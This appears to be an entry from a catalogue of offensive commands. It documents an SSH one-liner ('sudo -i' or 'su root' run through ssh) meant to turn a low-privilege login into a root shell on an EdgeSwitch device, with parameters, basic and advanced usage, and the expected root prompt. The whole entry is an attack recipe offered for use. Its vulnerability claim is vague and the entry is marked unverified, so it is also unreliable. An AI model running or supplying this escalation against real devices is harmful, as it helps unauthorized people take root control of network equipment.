---
data: ssh privilege0_user@192.168.1.1 '/bin/sh -c "sudo -i"'
tags:
  - ssh
  - privilege-escalation
  - root-shell
type: command
output: null
executor: bash
platforms:
  - Embedded Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:35.642Z'
id: 9573cca5-29a0-4a5d-a138-5ad476c76a79
verified: false
validated: true
submitted: true
---
# ssh-root-shell

## Command

```bash
ssh privilege0_user@192.168.1.1 '/bin/sh -c "sudo -i"'
```

## Description

Attempts to spawn a root shell via SSH command execution, leveraging the vulnerability for privilege escalation on the EdgeSwitch.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| privilege0_user | Low-privilege SSH user | Yes |
| 192.168.1.1 | Device IP | Yes |
| '/bin/sh -c "sudo -i"' | Command to invoke root shell | Yes |

## Examples

### Basic Usage

```bash
ssh privilege0_user@192.168.1.1 '/bin/sh -c "sudo -i"'
```

### Advanced Usage

```bash
ssh privilege0_user@192.168.1.1 '/bin/sh -c "su root"'
```

## Expected Output

Root shell prompt (e.g., "#") or successful escalation confirmation.

## Related

- [[commands/ssh-execute-arbitrary]]
- [[procedures/Execute-Arbitrary-Shell-Commands-via-SSH-for-Root-Escalation]]
